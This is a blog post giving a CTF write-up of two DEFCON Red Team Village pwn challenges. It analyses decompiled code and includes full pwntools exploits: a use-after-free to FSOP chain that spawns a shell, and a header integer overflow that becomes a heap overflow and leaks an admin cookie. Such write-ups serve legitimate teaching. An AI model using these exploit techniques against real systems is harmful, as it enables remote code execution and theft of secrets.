---
title: The DEFCON Red Team Village CTF Experience
description: writeup on some DEFCON RTV CTF challenge
date: 2024-09-20 00:00:00 +0800
categories: [Writeups]
img_path: /assets/posts/2024-09-20-the-defcon-red-team-village-experience
tags: [pwn]
toc: True
---

The **Home Team Science and Technology Agency (HTX)** invited me and my friends to compete alongside them in this year's [DEFCON Red Team Village](https://redteamvillage.io/).

Although I didn't get to fly to Las Vegas to experience the conference, this was still my first involvement in DEFCON ever which I thought was really cool. I mostly attempted the pwn and rev challenges and some of them were rather interesting so I decided to write about it.

Hope you enjoy! 🤭

## Pwn - cr4b

Attached Files: [binary](/assets/posts/2024-09-20-the-defcon-red-team-village-experience/cr4b)

### Program Analysis

This program revolves around the manipulation of **slots**, which is used to store user data of any arbitrary size on the heap.

Apart from the usual functionality of **creating**, **modifying** and **deleting** the slot / user data, there are some other important functionalities that we should look into.

```c
struct slot
{
  char *buf;
  _QWORD size;
  _QWORD parsed_size;
  bool is_parsed;
  FILE *fd;
};
```

#### Parsing slots

Slots can be parsed, which essentially just looks for a marker in your user data.

```c
int __fastcall parse_data(slot *slot)
{
  unsigned __int64 i; // [rsp+18h] [rbp-8h]

  puts("Parsing data file...");
  for ( i = 0LL; i < slot->size - 1LL; ++i )
  {
    if ( *(_QWORD *)&slot->buf[i] == 0xB16C0FFEE )
    {
      printf("offset -> %u\n", i);
      memcpy(slot->buf, &slot->buf[i], slot->size - i);
      slot->parsed_size = slot->size - i;
      slot->is_parsed = 1;
      return puts("Parsing done!");
    }
  }
  return puts("Parsing failed!");
}
```

#### Saving Files

This essentially saves a parsed buffer to a file, and saves the open file descriptor in the `slot` struct.

```c
unsigned __int64 __fastcall save(slot *a1)
{
  FILE *s; // [rsp+18h] [rbp-1018h]
  char dest[4096]; // [rsp+20h] [rbp-1010h] BYREF
  unsigned __int64 v4; // [rsp+1028h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(dest, 0, sizeof(dest));
  if ( a1->is_parsed )
  {
    if ( a1->fd )
    {
      s = (FILE *)a1->fd;
      fwrite(a1->buf, a1->parsed_size, 1uLL, s);
    }
    else
    {
      memcpy(dest, "/tmp/", 5uLL);
      read_filename(&dest[5], 0xFFAuLL);
      if ( strstr(dest, "..") )
      {
        puts("File name can't have .. in it");
        return v4 - __readfsqword(0x28u);
      }
      if ( strstr(dest, "flag") )
      {
        puts("File name can't have flag in it");
        return v4 - __readfsqword(0x28u);
      }
      s = fopen(dest, "w+");
      fwrite(a1->buf, a1->parsed_size, 1uLL, s);
    }
    fflush(s);
    a1->fd = s;
    printf("Saved to %s\n", dest);
    return v4 - __readfsqword(0x28u);
  }
  puts("Err: Saving unparsed data");
  return v4 - __readfsqword(0x28u);
}
```

#### Downloading Files

This function essentially prints the buffer of a parsed slot.

```c
unsigned __int64 download_file()
{
  int v1; // [rsp+0h] [rbp-1020h] BYREF
  unsigned int v2; // [rsp+4h] [rbp-101Ch] BYREF
  slot *v3; // [rsp+8h] [rbp-1018h]
  __int64 ptr[513]; // [rsp+10h] [rbp-1010h] BYREF
  unsigned __int64 v5; // [rsp+1018h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("Enter slot id: ");
  scanf("%d%*c", &v2);
  if ( v2 <= 5 && slots[v2].buf )
  {
    if ( !slots[v2].is_parsed )
    {
      puts("Data not parsed yet");
    }
    else
    {
      v3 = &slots[v2];
      printf("Download from: \n1) Memory\n2) Disk (Saved)\n> ");
      scanf("%d%*c", &v1);
      if ( v1 == 1 )
      {
        fwrite(v3->buf, v3->parsed_size, 1uLL, stdout);
      }
      else if ( v3->fd )
      {
        memset(ptr, 0, 4096);
        fread(ptr, v3->parsed_size, 1uLL, (FILE *)v3->fd);
        fwrite(ptr, v3->parsed_size, 1uLL, stdout);
      }
      else
      {
        printf("Project not found on disk");
      }
    }
  }
  else
  {
    puts("Invalid slot id");
  }
  return v5 - __readfsqword(0x28u);
}
```

### Vulnerability Analysis

The vulnerability of this program is straightforward.

In the `delete_slot` function, the user buffer is free-ed but the pointer is not cleared.

This leaves a dangling pointer to free-ed memory, giving us a **Use-After-Free (UAF) vulnerability**.

```c
unsigned __int64 delete_slot()
{
  unsigned int id; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enter slot id: ");
  scanf("%d%*c", &id);
  if ( id <= 5 && slots[id].buf )
  {
    free(slots[id].buf); // slot[id].buf is freed here, but it is not set to NULL
    if ( slots[id].fd )
      fclose(slots[id].fd);
    puts("Slot deleted!");
  }
  else
  {
    puts("Invalid slot id");
  }
  return v2 - __readfsqword(0x28u);
}
```

With only 5 slots to work with, we will try to go from a UAF to ultimately popping a shell to get RCE.

### Exploit Methodology

#### Getting Leaks to bypass ASLR

Using our `UAF` vulnerability, we are able to leak memory from a free-ed pointer.

However, how do we ensure that we are able to leak something meaningful _(libc, heap addresses)_ via our UAF?

##### The _IO_FILE struct

In the `save` function, it opens a file and saves the file descriptor to the `slot` struct.
```c
s = fopen(dest, "w+");
a1->fd = s;
```
Under the hood, all the file descriptors are backed with a `_IO_FILE` [struct](https://ddnet.org/codebrowser/include/bits/types/struct_FILE.h.html#_IO_FILE) which defines how a file operations / how a file is buffered.

This struct has a size of **0x1d0** and contains heap and libc pointers.

_It is homework for the reader to figure out why this struct needs libc and heap pointers :P_

##### Leaking the _IO_FILE struct

We are able to leak our pointers by following these steps

1. Allocate a buffer of size **0x1d0**
2. Parse the buffer
3. Delete the buffer **(UAF!!)**
4. Save the buffer to a file -- _this allocates the `IO_FILE` struct to where the buffer was before_
5. Leak the buffer via `download_file` (which now contains the `IO_FILE` struct)

In total, we have only allocated one slot in order to leak both the `libc` and `heap` pointer.

#### Getting an arbitrary write

We have 4 more slots to work with. We can do a **tcache unlinking attack** to arbitrarily allocate one chunk to any address that we want.

1. Allocate 2 slots one after another, Slot A and Slot B _(same size!)_
2. Delete Slot A, then delete slot B


The tcache is a linked list of freed chunks that will be re-allocated when a memory chunk of the same size is requested by the program.

In this case, the buffer in Slot A and Slot B are free-ed and stored in the tcache bin.

Slot B will be the first chunk that will be returned by the memory allocator followed by Slot A.

By modifying the **next pointer** in the metadata of Slot B _(which should be pointing to slot A)_, we can make it such that it points to any arbitrary address which will allow us to allocate memory to any address that we want and give us a write primitive.

{:start="3"}
3. Modify Slot B to point to any arbitrary address that we want.
4. Allocate Slot C _(this will reuse memory of slot B)_
5. Allocate Slot D _(this will be allocated to the arbitrary address we set earlier)_

#### Getting a Shell

With our arbitrary write, we can allocate do a **File Structure Oriented Programming (FSOP)** exploit to gain RCE.

> FSOP is a highly complicated technique that involves tracing the use of the `_IO_FILE` struct in the file structure **vtable** to call functions with specified arguments.
>
> This is very interesting to investigate and research. In practice, we can simply copy-paste pre-existing chains to get a shell :)
{:.prompt-info}

```py
standard_FILE_addr = libc.sym._IO_2_1_stdout_
fs = FileStructure()
fs.flags = unpack(b"  " + b"sh".ljust(6, b"\x00"), 64)  # "  sh"
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = standard_FILE_addr-0x10
fs.chain = libc.sym.system
fs._codecvt = standard_FILE_addr
fs._wide_data = standard_FILE_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps

print(bytes(fs))
```

### Final Exploit

```py
from pwn import *

context.binary = elf = ELF("./chal")
libc = elf.libc

# p = process(elf.path)
p = remote("167.71.108.36", 30301)

def alloc(size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendlineafter(b"data:\n", data)

def delete(idx):
    p.sendlineafter(b"> ", b"6")
    p.sendlineafter(b"id: ", str(idx).encode())

def parse(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"id: ", str(idx).encode())

def export(idx, mem=1):
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"id: ", str(idx).encode())
    p.sendlineafter(b"> ", str(mem).encode())

def modify(idx, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"id: ", str(idx).encode())
    p.sendlineafter(b"data:\n", data)

def save(idx, filename):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"id: ", str(idx).encode())
    p.sendlineafter(b"filename: ", str(filename).encode())

MARKER = 0xB16C0FFEE

alloc(0x1d0, p64(MARKER) + b"HELLOWORLD")
parse(0)
delete(0)
save(0, b"asd")
export(0)
leak = p.recvline()
libc.address = u64(leak[0x68:0x70]) - 2061984
heap_leak = u64(leak[8:16])
log.info(f"libc leak @ {hex(libc.address)}")
log.info(f"heap leak @ {hex(heap_leak)}")

standard_FILE_addr = libc.sym._IO_2_1_stdout_
fs = FileStructure()
fs.flags = unpack(b"  " + b"sh".ljust(6, b"\x00"), 64)  # "  sh"
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = standard_FILE_addr-0x10
fs.chain = libc.sym.system
fs._codecvt = standard_FILE_addr
fs._wide_data = standard_FILE_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps

print("length:",len(bytes(fs)))

alloc(0x100, p64(MARKER) + b"first")
alloc(0x100, p64(MARKER) + b"second")
parse(1)
parse(2)
delete(1)
delete(2)

target = libc.sym._IO_2_1_stdout_
enc_ptr = target ^ ((heap_leak+0x1020) >> 12)
modify(2, p64(enc_ptr))

alloc(0x100, p64(MARKER))
alloc(0x100, bytes(fs))

p.interactive()
```

## Pwn - Baby XSS

Attached Files: [pwn-xss.zip](/assets/posts/2024-09-20-the-defcon-red-team-village-experience/pwn-xss.zip)

This challenge is more elegant and interesting than the previous challenge.

### Program Functionality

The program provided hosts a HTTP web server with a few functionalities.

1. `/feedback`
    - Allows you to pass in user input as a URL parameter
2. `/comment`
    - Allows you to pass in user input via request body
3. `/report`
    - Same as `feedback`, except the admin visits the website with your feedback

```c
struct Response* handle_request(struct Request* req, char* path) {
    struct Response* resp = (struct Response*)malloc(sizeof(struct Response));

    memset((char*)resp, 0, sizeof(struct Response));
    resp->content_type = (char*)malloc(39);
    memcpy(resp->content_type, "Content-Type: text/html;charset=utf-8\r\n", 39);

    switch (req->method) {
        case GET: {
            if (!strncmp(req->path, "/index", 6)) {
                int fd = open(TEMPLATE_PATH, O_RDONLY);
                if (fd < 0) {
                    perror("open");
                    exit(-1);
                }

                struct stat st;
                stat(TEMPLATE_PATH, &st);

                resp->status = Ok;
                resp->resp_body = (char*)malloc(st.st_size);
                // resp->content_type = (char*)malloc(39);

                read(fd, resp->resp_body, st.st_size);
            } else if (!strncmp(req->path, "/feedback?fb=", 13)) {
                char *feedback = req->path + 13;
                resp->resp_body = (char*)malloc(15+strlen(feedback));
                sprintf(resp->resp_body, "Your Feedback: %s\0", feedback);

                resp->status = Ok;
                // resp->content_type = (char*)malloc(39);
            } else if (!strncmp(req->path, "/\0", 2)) {
                resp->status = MovedPermanently;
                resp->headers = (char*)malloc(18);

                memcpy(resp->headers, "Location: /index\r\n", 18);
            }  else if (!strncmp(req->path, "/report", 7)) {
                if (!strncmp(req->path, "/report?fb=", 11)) {
                    char *feedback = req->path + 11;
                    Feedback = (char*)malloc(strlen(feedback));

                    strcpy(Feedback, feedback);

                    for (int i = 0; i < strlen(feedback); i++) {
                        if (Feedback[i] == '\'') {
                            Feedback[i] = '"';
                        }
                    }

                    pthread_cond_signal(&bot_cond_var);

                    resp->status = Ok;
                    resp->resp_body = (char*)malloc(46);
                    memcpy(resp->resp_body, "</h1>Admin will check your feedback soon</h1>\0", 46);
                } else {
                    resp->status = Bad;
                    resp->resp_body = (char*)malloc(24);
                    memcpy(resp->resp_body, "<h1>Feedback not found</h1>\0", 24);
                }
            } else {
                resp->status = NotFound;
                resp->resp_body = (char*)malloc(24);
                memcpy(resp->resp_body, "<h1>Page Not Found</h1>\0", 24);
            }
            break;
        }
        case POST: {
            if (!strncmp(req->path, "/comment", 8)) {
                if (!strncmp(req->body, "comment=", 8)) {
                    char *comment = req->body+8;

                    resp->status = Ok;
                    resp->resp_body = (char*)malloc(20+strlen(comment));
                    sprintf(resp->resp_body, "<p>commoner: %s</p>\0", comment);

                    break;
                };

                resp->status = Bad;
                resp->resp_body = (char*)malloc(44);
                memcpy(resp->resp_body, "<h1>Post data does not contain comment</h1>\0", 44);
                break;
            }
        }
        default: {
                resp->status = NotFound;
                resp->resp_body = (char*)malloc(32);
                memcpy(resp->resp_body, "<h1>Method not implemented</h1>\0", 32);
            }
    };

    return resp;
}
```

#### Red Herrings

When you make a `report`, this function is executed, whereby the admin visits the user's feedback with its own admin cookie **(that is also the flag)**.

```c
void bot_visit(){
    char command[0x200];

    while (true) {
        pthread_cond_wait(&bot_cond_var, &bot_mutex);

        sleep(2);
        sprintf(&command, "curl 'http://localhost:1337/feedback?fb=%s' -H 'User-Agent: The king of kings' -H 'Accept:' -H 'Host:' -H 'Cookie: auth=%s'", Feedback, admin_cookie);
        // info(command);
        free(Feedback);
        Feedback = 0;

        // ?!?!?!?!?!?!?!?!?!?! omg no wayyyyyyy, command injection?!?!??!?
        system(command);
    }
}
```

To any experienced CTF players, `reflected HTML` inputs and admin visiting a user's input would immediately ring the bell that there might be a **Reflected Cross Site Scripting (XSS) vulnerability**. 

Furthermore, we can also see that the input is substituted into a `curl` command and executed which might hint at a command injection.

However, there are a few points to note.

1. curl-ing a website does not run any javascript code on the website --> there is no reflected XSS
2. single quotes are filtered from the `Feedback` --> there is no command injection since you cannot escape the quotes

Let's look elsewhere

#### Parsing HTTP Headers

This function primarily parses the incoming HTTP request.

```c
struct Request *parse_request(int fd) {
    struct Request request, *request_p;
    char *line = recvline(fd);
    char *ptr = 0;
    char *buffer = 0;

    memset((char*)&request, 0, sizeof(struct Request));

    // parse status line
    request.method = get_request_method(line);
    request.path = get_request_path(line);

    free(line);
    line = 0;

    while (true) {
        line = recvline(fd);
        if (*line == 0x0d) {
            break;
        }

        if (!strncmp("Host: ", line, 6)) {
            ptr = line + 6;
            if (strlen(ptr) <= MAX_HOST_LEN) {
                buffer = (char*)malloc(strlen(ptr));
                strcpy(buffer, ptr);
                request.host = buffer;
            }
        } else if (!strncmp("Cookie: ", line, 8)) {
            ptr = line + 8;
            if (strlen(ptr) <= MAX_COOKIE_LEN) {
                buffer = (char*)malloc(strlen(ptr));
                strcpy(buffer, ptr);
                request.cookie = buffer;
            }
        } else if (!strncmp("User-Agent: ", line, 12)) {
            ptr = line + 12;
            if (strlen(ptr) <= MAX_USERAGENT_LEN) {
                buffer = (char*)malloc(strlen(ptr));
                strcpy(buffer, ptr);
                request.cookie = buffer;
            }
        } else if (!strncmp("Content-Length: ", line, 16)) {
            ptr = line + 16;
            sscanf(ptr, "%zu", &request.content_length);

            if (request.content_length > MAX_CONTENT_LENGTH) {
                info("Invalid Content length");
                exit(-1);
            }

            request_p = (struct Request*)malloc(sizeof(struct Request) + request.content_length);
        } else if (!strncmp("Upgrade-Insecure-Requests: ", line, 27)) {
            ptr = line + 27;
            sscanf(ptr, "%zu", &request.upgrade_insecure_requests);
        }

        free(line);
        line = 0;
        buffer = 0;
    }

    free(line);
    line = 0;

    if (!request.content_length) {
        request_p = (struct Request*)malloc(sizeof(struct Request));
    }

    memcpy((char*)request_p, (char*)&request, sizeof(struct Request));

    if (request_p->content_length) {
        read(reqfd, (char*)request_p->body, request.content_length);
    }

    return request_p;
}
```

The interesting snippet of code can be found here.

```c
// struct of the request
struct Request {
    enum Method method;
    char* path;
    char* host;
    char* user_agent;
    int upgrade_insecure_requests;
    size_t content_length;
    char* cookie;
    char body[];
} __attribute__((packed));

if (!strncmp("Content-Length: ", line, 16)) {
    ptr = line + 16;
    sscanf(ptr, "%zu", &request.content_length);

    if (request.content_length > MAX_CONTENT_LENGTH) {
        info("Invalid Content length");
        exit(-1);
    }

    request_p = (struct Request*)malloc(sizeof(struct Request) + request.content_length); // allocate content_length number of requests

} else if (!strncmp("Upgrade-Insecure-Requests: ", line, 27)) {
    ptr = line + 27;
    sscanf(ptr, "%zu", &request.upgrade_insecure_requests); // VULNERABLE! read size_t into an int variable, buffer overflow!
}
```

The `content_length` variable specifies the amount of bytes in the heap to allocate to store the request.

The `upgrade_insecre_requests` variable is specified as an integer **(4 bytes)**, but input is taken in via `%zu` format specifier which is a size\_t type **(8 bytes)**.

By providing a large integer in the `Upgrade-Insecure-Requests` header _(larger than 0xFFFFFFFF)_, **we can overflow into the next variable**.

Finally, the rest of the request body is read into the allocated memory _(up to content\_length number of bytes)_.

```c
if (request_p->content_length) {
    read(reqfd, (char*)request_p->body, request.content_length);
}
```

We can do a heap buffer overflow here!

### Exploit Methodology

#### Getting a Heap Overflow

We will set the Content-Length header before the Upgrade-Insecure-Requests header

1. The program allocates memory for the request body based on the original Content-Length
2. The program reads in the `Upgrade-Insecure-Requests` header. We can do an overflow here to modify the Content-Length to a larger value
3. Now when the program reads in the request body, there is a heap overflow.

Using this heap overflow, we can attempt to leak the flag.

#### Leaking / Retrieving the Flag

As we saw earlier, the `report` feature does a `curl` with the flag cookie.

This cookie value is also allocated and stored on the heap when the request is being parsed.

```c
if (!strncmp("Cookie: ", line, 8)) {
    ptr = line + 8;
    if (strlen(ptr) <= MAX_COOKIE_LEN) {
        buffer = (char*)malloc(strlen(ptr));
        strcpy(buffer, ptr);
        request.cookie = buffer;
    }
}
```

We can make a request with data in the request body via the `comment` feature, which will echo our comment to us.

```c
if (!strncmp(req->path, "/comment", 8)) {
    if (!strncmp(req->body, "comment=", 8)) {
        char *comment = req->body+8;

        resp->status = Ok;
        resp->resp_body = (char*)malloc(20+strlen(comment));
        sprintf(resp->resp_body, "<p>commoner: %s</p>\0", comment);

        break;
    };
    // truncated
}
```

Since the flag is on the heap, and our overflow is also on the heap, we can attempt to leak the flag by overwriting all the NULL bytes between our request body and the flag on the heap such that the response will leak the value of the flag.

![image](xss_heap_vis.png)


If we pad the entire chunk of junk between our response and flag, we can leak the flag like this


![image](xss_heap_solved.png)


```
[+] Opening connection to 127.0.0.1 on port 1337: Done
b'HTTP/1.1 200 Ok\r\n'
[+] Opening connection to 127.0.0.1 on port 1337: Done
b'HTTP/1.1 200 Ok\r\n'
[+] Opening connection to 127.0.0.1 on port 1337: Done
b'HTTP/1.1 200 Ok\r\n'
[+] Opening connection to 127.0.0.1 on port 1337: Done
b'HTTP/1.1 200 Ok\r\n'
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] Receiving all data: Done (220B)
[*] Closed connection to 127.0.0.1 port 1337
b'HTTP/1.1 200 Ok\r\nContent-Type: text/html;charset=utf-8\r\n\r\n<p>commoner: AAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAflag{fake_flag_for_testing}\r</p>'
[*] Closed connection to 127.0.0.1 port 1337
[*] Closed connection to 127.0.0.1 port 1337
[*] Closed connection to 127.0.0.1 port 1337
[*] Closed connection to 127.0.0.1 port 1337

[Process exited 0]
```

### Exploit Script

```py
from pwn import *

def payload(method, path, host="", cookie="", ua="", cl="256", uir="upgrade-insecure"):
    payload = f"{method} {path} HTTP/1.1\n"
    payload += f"Content-Length: {cl}\n"
    payload += f"Upgrade-Insecure-Requests: {uir}\n"
    payload += "\r"
    return payload

HOST = "127.0.0.1"
PORT = 1337

# we do this to groom our heap such that the flag remains on the heap despite being free-ed
for i in range(4):
    p = remote(HOST, PORT)
    p.sendline(b"GET /report?fb= HTTP/1.1\n\r\n")
    print(p.recvline())
    sleep(3)

p = remote(HOST, PORT)

# content length = str(0x1) allocates 1 byte for the request body
# upgrade insecure request = str(0x700deadbeef) overflows and modifies content length to 0x700
p.sendline(payload("POST", "/comment", cl=str(0x1), uir=str(0x700deadbeef)).encode())

# we pad between our request body to the flag on the heap
p.send(b"comment=" + b"A"*0x75)

# the program will crash since we have smashed the heap, but we have completed our objective
print(repr(p.recvall()))
```
